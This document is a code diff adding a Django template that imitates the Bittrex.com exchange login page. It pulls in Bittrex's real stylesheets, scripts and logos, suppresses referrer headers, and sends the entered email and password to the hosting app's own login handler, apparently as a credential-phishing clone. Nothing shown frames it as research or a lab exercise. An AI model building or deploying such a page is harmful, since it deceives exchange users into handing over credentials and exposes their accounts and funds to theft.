@@ -1,0 +1,112 @@
+{% load static %}
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Bittrex.com - Log in</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer" />
+    <meta name="referrer" content="never" />
+
+    <!-- ****** faviconit.com favicons ****** -->
+    <!-- Basic favicons -->
+    <link rel="shortcut icon" sizes="16x16 32x32 48x48 64x64" href="https://bittrex.com/Content/img/logos/bittrex.ico">
+    <link rel="shortcut icon" type="image/x-icon" href="https://bittrex.com/Content/img/logos/bittrex.ico">
+
+    <link rel="icon" type="image/png" sizes="195x195" href="{% static  'Content/img/logos/bittrex-195.html' %}">
+    <!-- For iPad with high-resolution Retina Display running iOS ≥ 7 -->
+    <link rel="apple-touch-icon" sizes="152x152" href="{% static  'Content/img/logos/bittrex-152.png' %}">
+    <!-- For iPad with high-resolution Retina Display running iOS ≤ 6 -->
+    <link rel="apple-touch-icon" sizes="144x144" href="{% static  'Content/img/logos/bittrex-144.png' %}">
+    <!-- For iPhone with high-resolution Retina Display running iOS ≥ 7 -->
+    <link rel=" apple-touch-icon" sizes="120x120" href="{% static  'Content/img/logos/bittrex-120.png' %}">
+    <!-- For iPhone with high-resolution Retina Display running iOS ≤ 6 -->
+    <link rel="apple-touch-icon" sizes="114x114" href="{% static  'Content/img/logos/bittrex-114.png' %}">
+    <!-- For Google TV devices -->
+    <link rel="icon" type="image/png" sizes="96x96" href="{% static  'Content/img/logos/bittrex-96.png' %}">
+    <!-- For iPad Mini -->
+    <link rel="apple-touch-icon" sizes="76x76" href="{% static  'Content/img/logos/bittrex-76.png' %}">
+    <!-- For first- and second-generation iPad -->
+    <link rel="apple-touch-icon" sizes="72x72" href="{% static  'Content/img/logos/bittrex-72.png' %}">
+    <!-- For non-Retina iPhone, iPod Touch and Android 2.1+ devices -->
+    <link rel="apple-touch-icon" href="{% static  'Content/img/logos/bittrex-57.png' %}">
+    <!-- Windows 8 Tiles -->
+    <meta name="msapplication-TileColor" content="#FFFFFF">
+    <meta name="msapplication-TileImage" content="{% static  'Content/img/logos/bittrex-144.png' %}">
+    <!-- ****** faviconit.com favicons ****** -->
+
+    <!-- Core CSS -->
+    <link href="https://bittrex.com/content/tpcore?v=QJ3wNu5EQ6UlCjsTJdbaOLSWB_y7J7AB8BJJdZDroBo1" rel="stylesheet"/>
+
+    <link href="https://bittrex.com/content/datatables?v=V8Z9lEDy7UIqnRXRLbTNYwvRqsSCW24JRZPrC0xpwOw1" rel="stylesheet"/>
+
+    <link href="https://bittrex.com/content/bcore?v=Mu4k6pOKqoJbnH1qGHzl2Wzi9spro5O2h14vkAd5aKo1" rel="stylesheet"/>
+
+    <script src="https://bittrex.com/bundles/modernizr?v=inCVuEFe6J4Q07A0AcRsbJic_UE5MwpRMNGcOtk94TE1"></script>
+
+
+    <!-- this page specific styles -->
+    
+    <link href="https://bittrex.com/Content/signin?v=oYu6h55eLWfoqq7UzqjK-ZD7-K8O6P5SuYd9I3QtYFo1" rel="stylesheet"/>
+
+
+
+    <!-- open sans font -->
+    <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet noreferrer' type='text/css' />
+    <!-- lato font -->
+    <link href='https://fonts.googleapis.com/css?family=Lato:300,400,700,900,300italic,400italic,700italic,900italic' rel='stylesheet noreferrer' type='text/css' />
+
+
+</head>
+<body>
+    
+
+
+
+
+    <div class="login-wrapper">
+        <a href="https://bittrex.com/">
+            <img class="logo" src="{% static  'Content/img/logos/bittrex-logo-white-no-tagline.png' %}" alt="bittrex.com" />
+
+        </a>
+        <div class="box">
+            <div class="content-wrap">
+<form action="{% url 'login' %}" class="form-horizontal" id="loginForm" method="post" role="form">
+
+    <h6>Log in</h6>
+        {% csrf_token %}
+    <input autofocus="autofocus" required="" class="form-control" id="username" name="username" placeholder="Email Address" type="text" value="" /><span class="field-validation-valid" data-valmsg-for="UserName" data-valmsg-replace="true"></span><input autocomplete="off" class="form-control" data-val="true" data-val-required="The Password field is required." id="Password" name="password" placeholder="Your Password" type="password" /><span class="field-validation-valid" data-valmsg-for="Password" data-valmsg-replace="true"></span><input data-val="true" data-val-required="The Remember me? field is required." id="RememberMe" name="RememberMe" type="checkbox" value="true" /><input name="RememberMe" type="hidden" value="false" /><label for="RememberMe" style="margin-left:3px">Remember me?</label>                    <a href="PasswordReset.html" class="forgot">Forgot password?</a>
+                    <button class="g-recaptcha btn btn-primary login">
+                        <i class="fa fa-sign-in"></i>&nbsp;Login
+                    </button>
+</form>            </div>
+        </div>
+        <div class="no-account">
+            <p>
+                Don't have an account?
+                <a href="Register.html">Sign Up</a>
+            </p>
+        </div>
+    </div>
+
+    <script src="https://bittrex.com/bundles/tpcore?v=mFMGI5b0zWcBIxRIcWepn_4CsIjZ9sHStdwUn338-Vw1"></script>
+
+    
+
+    
+    <script src='../../www.google.com/recaptcha/api.js'></script>
+
+    <script>
+        function OnSubmit(token) {
+            document.getElementById("loginForm").submit();
+        }
+
+    </script>
+
+
+
+</body>
+
+
+</html>
